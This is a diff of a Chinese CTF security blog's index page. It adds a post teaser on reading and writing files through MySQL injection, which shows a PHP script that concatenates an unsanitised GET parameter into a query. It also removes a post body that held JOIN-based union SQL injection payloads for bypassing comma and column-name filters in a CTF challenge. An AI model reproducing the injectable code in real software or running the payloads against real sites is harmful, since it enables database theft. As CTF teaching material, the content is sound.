@@ -150,6 +150,91 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-mysql-read-write-file-20190924" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/09/24/mysql-read-write-file-20190924/">Mysql读取/写入文件</a>
+    </h1>
+  
+
+        
+        <a href="/2019/09/24/mysql-read-write-file-20190924/" class="archive-article-date">
+  	<time datetime="2019-09-24T03:13:22.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-24</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>当有sql注入时，除了读取数据，常见的比如写webshell，读取flag等</p>
+<h1 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$mysqli  = <span class="keyword">new</span> mysqli(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">""</span>,<span class="string">"test"</span>);</span><br><span class="line">$sql = <span class="string">"select * from user where id="</span>.$id;</span><br><span class="line">$result = $mysqli-&gt;query($sql);</span><br><span class="line">$row = $result-&gt;fetch_assoc();</span><br><span class="line"><span class="keyword">echo</span> $row[<span class="string">'username'</span>];</span><br><span class="line">$result-&gt;free();</span><br><span class="line">$mysqli-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+        
+          <a class="article-more-a" href="/2019/09/24/mysql-read-write-file-20190924/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">SQLi</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/09/24/mysql-read-write-file-20190924/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-sqli-join-20190910" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -171,20 +256,9 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h1 id="正常使用"><a href="#正常使用" class="headerlink" title="正常使用"></a>正常使用</h1><p>join默认是内连，还分左连，右连，全连。这个知识点具体还是百度吧。<br>语句类似如下<br><code>select * from table1 join table2 on table1.id = table2.id</code><br>这样会输出table1和table2中id相同的全部列。也可以选择只输出部分列<br><code>select table1.name table2.xxx from table1 join table2 on table1.id = table2.id</code></p>
-<h1 id="绕过逗号"><a href="#绕过逗号" class="headerlink" title="绕过逗号"></a>绕过逗号</h1><p>直接看图吧<br><code>select * from user where id = 1 union select * from ((select 1)A JOIN (select 2)B JOIN (select 3)C);</code></p>
-<img src="/2019/09/10/sqli-join-20190910/1.png">
-<p>可以在三个select中任选一个换成查找数据的payload<br><code>select * from user where id = 1 union select * from ((select group_concat(schema_name) from information_schema.schemata)A JOIN (select 2)B JOIN (select 3)C);</code></p>
-<img src="/2019/09/10/sqli-join-20190910/2.png">
-
-<h1 id="绕过列名过滤"><a href="#绕过列名过滤" class="headerlink" title="绕过列名过滤"></a>绕过列名过滤</h1><img src="/2019/09/10/sqli-join-20190910/3.png">
-<p>现在假设<code>id</code>,<code>username</code>,<code>password</code>三个关键字都是不准输入的，现在需要查找username=’admin’的数据<br><code>select * from (select * from ((select 1)A join (select 2)B join (select 3)C) union select * from user)x where x.2 = &#39;admin&#39;;</code></p>
-<img src="/2019/09/10/sqli-join-20190910/4.png">
-<p>利用条件的话是需要知道加粗部分表名的结构（列数，select * 时列的顺序），实际攻击msyql时都是查找的information_schema中的表，可以在本地查看<br>select * from (select * from ((select 1)A join (select 2)B join (select 3)C) union select * from <strong>user</strong>)x where x.2 = ‘admin’;</p>
-<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>i春秋上 “百度杯”CTF比赛九月场SQLi<br>直接访问链接，有两处提示</p>
-<img src="/2019/09/10/sqli-join-20190910/5.png">
-<img src="/2019/09/10/sqli-join-20190910/6.png">
-<p>有效的是<code>l0gin.php?id=1</code><br>会对逗号截断，没有其他拦截措施</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=0' union <span class="keyword">select</span> * <span class="keyword">from</span> ((<span class="keyword">select</span> <span class="keyword">group_concat</span>(schema_name) <span class="keyword">from</span> information_schema.schemata)A <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)B)%<span class="number">23</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">0</span><span class="string">' union select * from ((select group_concat(table_name) from information_schema.tables where table_schema='</span>sqli<span class="string">')A join (select 2)B)%23</span></span><br><span class="line"><span class="string">id=0'</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> ((<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">'sqli'</span> <span class="keyword">and</span> table_name = <span class="string">'users'</span>)A <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)B)%<span class="number">23</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">0</span><span class="string">' union select * from ((select group_concat(flag_9c861b688330) from users)A join (select 2)B)%23</span></span><br></pre></td></tr></table></figure>
+        
+          <a class="article-more-a" href="/2019/09/10/sqli-join-20190910/#more">more >></a>
+        
       
 
       
